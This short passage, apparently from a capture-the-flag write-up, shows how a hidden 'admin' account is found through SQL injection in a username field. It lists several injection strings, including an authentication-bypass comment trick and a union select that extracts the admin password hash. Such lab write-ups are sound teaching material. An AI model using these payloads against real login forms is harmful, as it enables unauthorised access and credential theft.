In addition to the user caligula, there is another user admin which can be
detected in a number of ways.

By trying a username of 
    "' or 1 order by random() --"
a few times or else trying out other orderings such as
    "' or 1 order by username --"
or even just guessing "admin" and putting a username of
    "admin' --"

The same trick with the union operator from the writeup can be
performed on the "admin" user. By submitting a username of
    "' union select password from users where username='admin' --"
the password for the admin user is shown, which happens to
contain an md5 hash.
